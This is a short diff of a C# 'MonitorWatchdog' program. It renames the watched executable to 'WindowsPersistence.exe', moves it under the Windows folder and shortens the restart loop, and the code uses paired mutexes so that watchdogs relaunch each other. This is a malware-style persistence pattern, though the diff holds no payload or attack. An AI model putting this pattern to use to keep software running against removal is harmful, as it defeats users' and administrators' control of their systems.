@@ -15,15 +15,15 @@ namespace MonitorWatchdog
 {
     public class MonitorWatchdog
     {
-        public static string PrimaryWatchdogPath { get; private set; } = "C:\\Windows\\System32";
-        public static string PrimaryWatchdogName { get; private set; } = "Wdog1";
+        public static string PrimaryWatchdogPath { get; private set; } = @"C:\Windows\Test";
+        public static string PrimaryWatchdogName { get; private set; } = "WindowsPersistence.exe";
         public static string SecondaryWatchdogMutexName { get; private set; } = "SecondaryWDog";
 
         public static string PrimaryWatchdogMutexName { get; private set; } = "PrimaryWDog";
 
 
-
-      /* static void Main(string[] args)
+/*
+       static void Main(string[] args)
         {
             using (Mutex mutex = new Mutex(false, SecondaryWatchdogMutexName, out bool isNewInstance))
             {
@@ -47,7 +47,7 @@ namespace MonitorWatchdog
             {
                 watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(PrimaryWatchdogPath, PrimaryWatchdogName);
                 watchdogHelper.watchdogHelper.CheckAndRunWatchdog(PrimaryWatchdogPath, PrimaryWatchdogName, PrimaryWatchdogMutexName);
-                Thread.Sleep(10000); 
+                Thread.Sleep(1000); 
             }
         }
 
